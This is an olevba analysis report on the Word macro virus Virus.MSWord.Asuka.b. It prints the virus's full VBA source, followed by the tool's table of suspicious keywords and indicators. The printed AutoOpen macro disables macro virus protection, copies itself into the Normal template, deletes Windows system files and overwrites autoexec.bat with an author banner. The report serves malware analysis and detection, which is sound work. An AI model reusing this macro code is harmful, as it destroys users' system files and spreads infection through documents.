olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Asuka.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Asuka.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: Virus.MSWord.Asuka.b - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function Donde_esta_Windowsdirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Sub AutoOpen()
Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
ShowVisualBasicEditor = False
Dim DirName As String
Dim Shinji As String
    DirName = Donde_esta_Windows()
    Shinji = DirName
On Error GoTo RutinaDeError
ActiveDocument.SaveAs FileName:=NormalTemplate.Path & "\" & NormalTemplate.Name, FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
Kill (Shinji + "command.com")
Kill (Shinji + "winfile.exe")
Kill (Shinji + "\system\appwiz.cpl")
Kill (Shinji + "\system\sysdm.cpl")
'aca van los archivos: c:\windows\explorer.exe, c:\windows\winfile.exe, c:\windows\command.com, c:\windows\system\appwiz.cpl, c:\windows\system\sysdm.cpl, acuerdate de poner Shinji
Open "c:\autoexec.bat" For Output As #1
Print #1, "@echo off"
Print #1, "cls"
Print #1, "ECHO          *********************************************************"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                    ViRuS: ASUKA AT                    *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                         AUTOR:                        *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                  ©©©© ZaHACKieL  ©©©©                 *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                      LIMA - PERU                      *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                       03/JUN/00                       *"
Print #1, "ECHO          *                                                       *"
Print #1, "ECHO          *                     ®®®®®®®®®®®®®®                    *"
Print #1, "ECHO          *                     §            §                    *"
Print #1, "ECHO          *                     §   A.B.G    §                    *"
Print #1, "ECHO          *********************************************************"
Print #1, "pause"
Close #1
Application.Visible = False
RutinaDeError:
Exit Sub
End Sub

Function Donde_esta_Windows() As String
    Dim Temp As String
    Dim Ret As Long
    Const MAX_LENGTH = 145

    Temp = String$(MAX_LENGTH, 0)
    Ret = Donde_esta_Windowsdirectory(Temp, MAX_LENGTH)
    Temp = Left$(Temp, Ret)
    If Temp <> "" And Right$(Temp, 1) <> "\" Then
        Donde_esta_Windows = Temp & "\"
    Else
        Donde_esta_Windows = Temp
    End If
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winfile.exe         |Executable file name                         |
|IOC       |appwiz.cpl          |Executable file name                         |
|IOC       |sysdm.cpl           |Executable file name                         |
|IOC       |explorer.exe        |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

